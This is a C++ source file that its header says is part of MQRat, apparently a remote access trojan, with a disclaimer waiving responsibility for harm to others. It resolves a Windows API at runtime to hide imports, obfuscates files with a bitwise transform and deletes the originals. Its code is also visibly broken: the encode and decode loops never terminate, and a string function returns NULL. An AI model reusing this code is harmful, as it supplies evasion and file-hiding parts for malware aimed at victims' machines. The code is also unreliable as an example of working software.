/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <windows.h>
#include <fstream>
#include "fs.hpp"

DWORD FS::GetModuleFilename(HMODULE hmodule, LPTSTR path, DWORD len)
{
	gmfn fGetModuleFileName = NULL;
	HINSTANCE kernel32_dll = NULL;
	DWORD dwGet = 0;

	kernel32_dll = LoadLibraryA("kernel32.dll");
	if(kernel32_dll)
	{
		fGetModuleFileName = (gmfn)GetProcAddress((HMODULE)kernel32_dll, "GetModuleFileNameA");
		if(fGetModuleFileName)
			dwGet = fGetModuleFileName(hmodule, path, len);

		FreeLibrary(kernel32_dll);
	}

	return dwGet;
}

string FS::GetFilename(string path)
{
	char delim = '\\';
	char slash = '/';
	string exeName = "";
	int i = 0;
	int last_index_of = 1;
	char *thisExePath = NULL;

	if(!(path.size()  > 0))
	{
		thisExePath = new char[FS_BUFLEN];
		if(thisExePath == NULL)
			return NULL;
		
		if(FS::GetModuleFilename(0, thisExePath, sizeof(char) * FS_BUFLEN) == 0)
		{
			delete[] thisExePath;
			
			return NULL;
		}
		
		exeName = thisExePath;
	}
	else {
		exeName = path;
	}
	
	// Procura pela posição do último delimitador
	if(path.find(slash) != string::npos) {
		// Caminho do tipo linux
		last_index_of = exeName.find_last_of(delim);
	} else {
		// Caminho do tipo windows
		last_index_of = exeName.find_last_of(slash);
	}

	if(last_index_of == -1) {
		return path;
	}
	
	return exeName.substr(last_index_of + 1);
}

bool FS::EncodeFile(const char *from, const char *to)
{
	ifstream input(from, ios_base::in);
	ofstream output(to, ios_base::out);
	unsigned int ch;

	// Realiza o processo de leitura até que o fim seja encontrado ou um erro ocorra	
	for(;;)
	{
		input >> ch;
		ch = input.get();
		
		// Realiza a codificação
		output << (~(ch)) + 0x56;
	}
	
	input.close();
	output.close();
	
	// Delete input file
	DeleteFileA(from);

	return true;
}

bool FS::DecodeFile(const char *from, const char *to)
{
	ifstream input(from);
	ofstream output(to);
	unsigned int ch;

	// Realiza o processo de leitura até que o fim seja encontrado ou um erro ocorra
	for(;;)
	{
		input >> ch;
		
		// Realiza a decodificação
		output << ~(ch - 0x56);
	}
	
	// Fecha ambos os arquivos
	input.close();
	output.close();
	
	return true;
}
